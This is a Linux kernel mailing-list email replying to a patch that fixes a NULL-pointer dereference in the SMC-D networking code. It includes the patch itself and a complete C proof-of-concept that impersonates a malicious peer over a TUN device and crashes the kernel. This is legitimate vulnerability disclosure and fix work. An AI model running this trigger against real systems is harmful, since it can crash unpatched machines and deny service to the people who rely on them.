Received: from mail-pg1-f175.google.com (mail-pg1-f175.google.com [209.85.215.175])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 45C2B2D2397
	for <linux-s390@vger.kernel.org>; Mon, 11 May 2026 06:29:11 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.215.175
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1778480952; cv=pass; b=kaUYJDeBbQLH7klO0AYeOIznbeX1fEi1t/OotqhqhPK1+y7EwaPzt7DR9dpuf4vM5GE85Ivcdz6+qeSpkO/N9ofgOhQd0yYWjKHSOfkecJv8A4QT4Oqd+f7aCT+SKAlly7GaGDuOE0AngpQz91OHFql98+HptJdlazrbHVJMWFA=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1778480952; c=relaxed/simple;
	bh=UfqjIUwBYKIBDa+U6ZmRbnZQAg8V/f1GM0bYT7rn11w=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=ujRbpj8nhnKUVs2ubkxCa6UOyPqjF998NN4SCGpb4v6id37xpLbb2FHsKbohdvuoi9N1ztEVxaYKsIVRB7K2TkoF0MkJVQzpvK6A+fZsHdfwKCrTFCPxgS9YeOyoUrU0MV9wX8vhnJTX+xdner6xe405Nx8pAytm2HAiqCYQcrU=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=mCQ7wY+I; arc=pass smtp.client-ip=209.85.215.175
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="mCQ7wY+I"
Received: by mail-pg1-f175.google.com with SMTP id 41be03b00d2f7-c8016d642b2so2215235a12.0
        for <linux-s390@vger.kernel.org>; Sun, 10 May 2026 23:29:11 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1778480951; cv=none;
        d=google.com; s=arc-20240605;
        b=DyLREqQOnmTWCCWsSnZyVumdzo0GzpY6P8BMjgT4lRa4QvfUWkWxQilDTBrMQ11Apf
         O1ZsjtqglZRCAatND1WgeGWjGSEgYINFU9W9OIJVc94+qkfVr0Q3JBcdATAkJ2vy39IX
         FrqxvOWN5kvJwFTbZ8qG2e10TIEm1f03YVmTt3f5djbVnf5UEMb3+m/jCtP9bynYzTXA
         CubhmMsDI+q8nZjBSxbYiJEgfn5ahsVGGRdYJRiKzGKhllWi4vT7GuoXUpLAQ9G0hXTy
         co1uebLS+O/gbCRuo189pYUNz6JsSRBMxuSvQE3QdTax6/PdbHrHjBt86453l3ZFm2Wf
         7jhw==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=JaSjt2o3QJ/HfrQwhvi9bOFakjV7hxzYfi162/WlEJw=;
        fh=qzyTt4a11KK+KOhlaqRC9D3wnAAOx3qAIiRRnXzu88s=;
        b=FFK2ZNATK/i9Wb2Vd2bY/N72D4GMBuc6yx7XqJpr3lq75w6m6wZuhroroIuYf5Lamm
         9bzwccqFbJc9w/4x7ukIWlxh9v5KNBn47FwZTfsS3WdqH076pNAyw9rInnMz3Yrcd+Cl
         JQ1jqcae6kanF6WAlJY9s0MCAj4rsy+/eiHBvhNB1OC3rIdgyqHKKClr3B4V0Y5/VueU
         4yHineGdffUR6nvpa7X8EVFXDeZuKyVApH3uH4oi5aGQ8yv5LLRY3y72TH0nEjEk0Cq2
         tUsD9uCxfCgfgW2kn3bQNiqc/D0Cp8REr3Z7rKddURjBCU21Ks6CHYSqzKF9O/gVDbAu
         Axzg==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1778480951; x=1779085751; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=JaSjt2o3QJ/HfrQwhvi9bOFakjV7hxzYfi162/WlEJw=;
        b=mCQ7wY+Iv/CDxkYCFFwTV6cKP6MDy2ZyGkvB/D3SgsFzuayd5RiCZS3xqvQ6TMQDMa
         H7g9P4tFduGL+AonW4wXS6KEYUBAXITXR1JKSSLQJyHsKh/IiEVuE+F5vp1rjEOP1gMW
         g4NQlGAxfSWPVqz8dQnUiR/S6X0y7yAAgfLIV0K7JO71Vc+zx+oflPZMgXviFuKpQL5C
         bljj4NRRXf2CKTCPt3tl0wXYKd2hkJtvxc+0Q/7xFBCY83aWXz9PhXcMBgkG8mHG9TOd
         nvve5DQM3KbUwj5Pt99Lh2fDvm4jqReNmWaz8s2x9Bqu7U9TMrkxYE8fgXkulp8sRb63
         d8CA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1778480951; x=1779085751;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=JaSjt2o3QJ/HfrQwhvi9bOFakjV7hxzYfi162/WlEJw=;
        b=Dwy5ojkkduT9IO8Uef/lIJ3VYEhAiBjLhnskeHp43xXQJPcyBxHb9TMf4O6xg4oznP
         OhQhFaRwokpiZmTu0noSsERzb71RbTB+JZLXmN2DVBPwk9J2I+tQzJaICCT8d1YmQ05U
         NH9fLWH00IGhKHYnl0gA5K+w1Xt48BUIzXoTyxqxwD35XDPFl2HZuihU5rgNyPY2dB7a
         /7grddXExg2oL2mJDwP8/rO+G2WwLRO3xdhFie2f6zIvkJsNBgnSQyIAn5s/EUstZfem
         hfqky2E8CJL2T/M1FJGYvwAztvFIVMhE9gjV2mcRQRXEZRZVEWNXqtQf8/VzifehV39v
         qvUQ==
X-Forwarded-Encrypted: i=1; AFNElJ+rGfm+J73/Hg9/CeGO1tQb/ouvTxOy+Lda/9UkRZTtOdiw5ga7jCXfMKGCAl6AvarOKOUBiOry92TP@vger.kernel.org
X-Gm-Message-State: AOJu0YycvybOXjvKdIe3FicP699vGHeB/eUp4/P35QoZhbrUu4ELpQ1q
	5ruOMUxQeRLCSQ7ViVl2dvLzojrpd7k8ZjDmRmZSoJnDQ6+Vf4xnjHUVTrnNK4dnDK/LsCc+KLF
	GA0/MGBk0HvNK/Cb52/wc9bG0TCD4fYgkmgo8z6Du
X-Gm-Gg: Acq92OH05bWzBnQp3DC5QpHypbYZC9dIpWhf49q5uBKDqWFWcALxsTvnZ2f1XnjS17l
	2Gy6Q2zQbVQKVnSw/RLMlqeNwQQT5XN6wMvGXgjWCNrs/3F/H3ZKV+7pdPeJDbELnwWu6HB72+R
	u8/DPZI5hb4PBheg2bW/OgqWjB91cT8ZNTy4x+vqbxgtI8aSw3+zNC9Pbos8pjCq0MYfagQJInN
	9fvsiHZMMSfeHkd9ke82jk5pf70Kj5LaOMDdVAcvksDRVdP/OthEa6zlLXGMoO/eUd44D/cbPYf
	xe9TDmDA
X-Received: by 2002:a05:6a21:3399:b0:3a2:edff:2975 with SMTP id
 adf61e73a8af0-3aa8c1e7570mr15729038637.25.1778480950615; Sun, 10 May 2026
 23:29:10 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-s390@vger.kernel.org
List-Id: <linux-s390.vger.kernel.org>
List-Subscribe: <mailto:linux-s390+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-s390+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260511062138.2839584-1-xmei5@asu.edu>
In-Reply-To: <20260511062138.2839584-1-xmei5@asu.edu>
From: Xiang Mei <xmei5@asu.edu>
Date: Sun, 10 May 2026 23:28:59 -0700
X-Gm-Features: AVHnY4IxiLLsMjpeijYDQGsbC35Qn9XIdiNi9mC52TQugcJ8Pq_f6893lz_KTdU
Message-ID: <CAPpSM+TRZA55VdLdP1oMCoV8wONKgP66LtW4zfA2XuHu7KBkQQ@mail.gmail.com>
Subject: Re: [PATCH net] net/smc: reject CHID-0 ACCEPT that matches an empty
 ism_dev slot
To: netdev@vger.kernel.org
Cc: alibuda@linux.alibaba.com, dust.li@linux.alibaba.com, 
	sidraya@linux.ibm.com, wenjia@linux.ibm.com, ubraun@linux.ibm.com, 
	linux-rdma@vger.kernel.org, linux-s390@vger.kernel.org, bestswngs@gmail.com
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Thanks for your attention to this bug. Here are some resources to help
you trigger the bug.

Required key configs:
```
CONFIG_SMC=3Dy
CONFIG_DIBS=3Dy
CONFIG_DIBS_LO=3Dy
```

Here is a PoC trigger that causes the intended crash shown in the
commit message:
```c
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <endian.h>
#include <fcntl.h>
#include <linux/if_tun.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#define AF_SMC 43
static int tun_fd;
static uint32_t my_ip, peer_ip; /* network byte order */
static const uint16_t PEER_PORT =3D 9999;

static uint16_t csum(const void *p, int n, uint32_t s) {
const uint16_t *q =3D p;
while (n > 1) { s +=3D *q++; n -=3D 2; }
if (n) s +=3D *(const uint8_t *)q;
while (s >> 16) s =3D (s & 0xffff) + (s >> 16);
return ~s;
}

static uint16_t tcp_csum(uint32_t sa, uint32_t da, const void *h, int n) {
struct { uint32_t s, d; uint8_t z, p; uint16_t l; } __attribute__((packed))
ph =3D { sa, da, 0, IPPROTO_TCP, htons(n) };
uint32_t s =3D 0;
for (unsigned i =3D 0; i < sizeof(ph) / 2; i++) s +=3D ((uint16_t *)&ph)[i]=
;
return csum(h, n, s);
}

/* Send IPv4+TCP packet on the TUN device. opt_len must be multiple of 4. *=
/
static void tx(uint16_t sport, uint16_t dport, uint32_t seq, uint32_t ack,
uint8_t flags, const void *opts, int opt_len,
const void *payload, int plen)
{
uint8_t buf[2048] =3D {0};
int thlen =3D sizeof(struct tcphdr) + opt_len;
int tcplen =3D thlen + plen;
int iplen =3D sizeof(struct iphdr) + tcplen;
struct iphdr *ip =3D (struct iphdr *)buf;
struct tcphdr *th =3D (struct tcphdr *)(buf + sizeof(*ip));

ip->version =3D 4; ip->ihl =3D 5; ip->tot_len =3D htons(iplen);
ip->ttl =3D 64; ip->protocol =3D IPPROTO_TCP;
ip->saddr =3D peer_ip; ip->daddr =3D my_ip;
ip->check =3D csum(ip, sizeof(*ip), 0);

th->source =3D htons(sport); th->dest =3D htons(dport);
th->seq =3D htonl(seq); th->ack_seq =3D htonl(ack);
th->doff =3D thlen / 4; th->window =3D htons(65535);
th->syn =3D !!(flags & 2); th->ack =3D !!(flags & 0x10);
th->psh =3D !!(flags & 8); th->rst =3D !!(flags & 4);
if (opt_len) memcpy(th + 1, opts, opt_len);
if (plen) memcpy((uint8_t *)th + thlen, payload, plen);
th->check =3D tcp_csum(peer_ip, my_ip, th, tcplen);

if (write(tun_fd, buf, iplen) < 0) perror("tun write");
}

/* TCP option: experimental, magic 0xE2D4C3D9 ("SMC"), len 6, + 2 NOPs. */
static const uint8_t SMC_OPT[8] =3D { 254, 6, 0xE2, 0xD4, 0xC3, 0xD9, 1, 1 =
};

/* Build the malicious 78-byte SMC-D V2 CLC ACCEPT with d1.chid =3D 0. */
static int build_accept(uint8_t out[78]) {
memset(out, 0, 78);
memcpy(out, "\xE2\xD4\xC3\xC4", 4); /* eyecatcher SMCD */
out[4] =3D 0x02; /* type =3D ACCEPT */
out[5] =3D 0x00; out[6] =3D 0x4E; /* length =3D 78 */
out[7] =3D (2 << 4) | 1; /* version=3DV2, typev1=3DSMC_TYPE_D */
/* d0.gid / d0.token: arbitrary; rest of d0/d1 zero (including d1.chid). */
memcpy(out + 74, "\xE2\xD4\xC3\xC4", 4); /* trailer eyecatcher */
return 78;
}

static void *responder(void *_) {
uint8_t pkt[2048];
uint32_t srv =3D 0xC0DECAFE, cli =3D 0;
uint16_t cport =3D 0;
int handshake =3D 0, sent_accept =3D 0;

while (1) {
int n =3D read(tun_fd, pkt, sizeof(pkt));
if (n <=3D 0) continue;
struct iphdr *ip =3D (struct iphdr *)pkt;
struct tcphdr *th =3D (struct tcphdr *)(pkt + ip->ihl * 4);
if (ip->protocol !=3D IPPROTO_TCP || ntohs(th->dest) !=3D PEER_PORT) contin=
ue;
cport =3D ntohs(th->source);
int plen =3D ntohs(ip->tot_len) - ip->ihl * 4 - th->doff * 4;

if (th->syn && !th->ack) { /* SYN */
cli =3D ntohl(th->seq) + 1;
tx(PEER_PORT, cport, srv, cli, 0x12, SMC_OPT, 8, NULL, 0);
srv++;
} else if (th->ack && !plen && !handshake) { /* SYN-ACK ACK */
handshake =3D 1;
} else if (handshake && plen > 0 && !sent_accept) { /* CLC PROPOSAL */
cli =3D ntohl(th->seq) + plen;
tx(PEER_PORT, cport, srv, cli, 0x10, NULL, 0, NULL, 0);
uint8_t accept[78];
int alen =3D build_accept(accept);
tx(PEER_PORT, cport, srv, cli, 0x18, NULL, 0, accept, alen);
srv +=3D alen;
sent_accept =3D 1;
}
}
}

/* Bring up TUN with my_ip via ioctls (rootfs /sbin/ip is broken in repro).=
 */
static void setup_tun(void) {
struct ifreq ifr =3D {0};
ifr.ifr_flags =3D IFF_TUN | IFF_NO_PI;
strncpy(ifr.ifr_name, "smc0", IFNAMSIZ - 1);
tun_fd =3D open("/dev/net/tun", O_RDWR);
if (tun_fd < 0 || ioctl(tun_fd, TUNSETIFF, &ifr) < 0) { perror("tun");
exit(1); }

int s =3D socket(AF_INET, SOCK_DGRAM, 0);
struct sockaddr_in *sin =3D (struct sockaddr_in *)&ifr.ifr_addr;
sin->sin_family =3D AF_INET; sin->sin_addr.s_addr =3D my_ip;
ioctl(s, SIOCSIFADDR, &ifr);
inet_pton(AF_INET, "255.255.255.0", &sin->sin_addr.s_addr);
ioctl(s, SIOCSIFNETMASK, &ifr);
ioctl(s, SIOCGIFFLAGS, &ifr);
ifr.ifr_flags |=3D IFF_UP | IFF_RUNNING;
ioctl(s, SIOCSIFFLAGS, &ifr);
close(s);
}

int main(void) {
inet_pton(AF_INET, "10.0.0.1", &my_ip);
inet_pton(AF_INET, "10.0.0.2", &peer_ip);
setup_tun();

pthread_t tid;
pthread_create(&tid, NULL, responder, NULL);
usleep(200 * 1000);

int s =3D socket(AF_SMC, SOCK_STREAM, 0);
if (s < 0) { perror("socket(AF_SMC)"); return 1; }
struct sockaddr_in sa =3D { .sin_family =3D AF_INET,
.sin_port =3D htons(PEER_PORT),
.sin_addr.s_addr =3D peer_ip };
fprintf(stderr, "[*] connecting AF_SMC ...\n");
connect(s, (struct sockaddr *)&sa, sizeof(sa)); /* expect: kernel oops */
sleep(5);
return 0;
}
```

Feel free to ask any questions to reproduce this issue.
Thanks,
Xiang

On Sun, May 10, 2026 at 11:21=E2=80=AFPM Xiang Mei <xmei5@asu.edu> wrote:
>
> On the SMC-D client, slot 0 of ini->ism_dev[]/ini->ism_chid[] is
> reserved for an SMC-Dv1 device. smc_find_ism_v2_device_clnt()
> populates V2 entries starting at index 1, so when no V1 device is
> selected slot 0 is left in its kzalloc()'ed state with ism_dev[0] =3D=3D
> NULL and ism_chid[0] =3D=3D 0.
>
> smc_v2_determine_accepted_chid() then matches the peer's CHID against
> the array starting from index 0 using the CHID alone. A malicious
> peer replying to a SMC-Dv2-only proposal with d1.chid =3D=3D 0 matches
> the empty slot, ini->ism_selected becomes 0, and the subsequent
> ism_dev[0]->lgr_lock dereference in smc_conn_create() faults at
> offsetof(struct smcd_dev, lgr_lock) =3D=3D 0x68:
>
>   BUG: KASAN: null-ptr-deref in _raw_spin_lock_bh+0x79/0xe0
>   Write of size 4 at addr 0000000000000068 by task exploit/144
>   Call Trace:
>    _raw_spin_lock_bh
>    smc_conn_create (net/smc/smc_core.c:1997)
>    __smc_connect (net/smc/af_smc.c:1447)
>    smc_connect (net/smc/af_smc.c:1720)
>    __sys_connect
>    __x64_sys_connect
>    do_syscall_64
>
> Require ism_dev[i] to be non-NULL before accepting a CHID match.
>
> Fixes: a7c9c5f4af7f ("net/smc: CLC accept / confirm V2")
> Reported-by: Weiming Shi <bestswngs@gmail.com>
> Assisted-by: Claude:claude-opus-4-7
> Signed-off-by: Xiang Mei <xmei5@asu.edu>
> ---
>  net/smc/af_smc.c | 3 ++-
>  1 file changed, 2 insertions(+), 1 deletion(-)
>
> diff --git a/net/smc/af_smc.c b/net/smc/af_smc.c
> index 185dbed7de5d..12ea3b6dbc64 100644
> --- a/net/smc/af_smc.c
> +++ b/net/smc/af_smc.c
> @@ -1400,7 +1400,8 @@ smc_v2_determine_accepted_chid(struct smc_clc_msg_a=
ccept_confirm *aclc,
>         int i;
>
>         for (i =3D 0; i < ini->ism_offered_cnt + 1; i++) {
> -               if (ini->ism_chid[i] =3D=3D ntohs(aclc->d1.chid)) {
> +               if (ini->ism_dev[i] &&
> +                   ini->ism_chid[i] =3D=3D ntohs(aclc->d1.chid)) {
>                         ini->ism_selected =3D i;
>                         return 0;
>                 }
> --
> 2.43.0
>
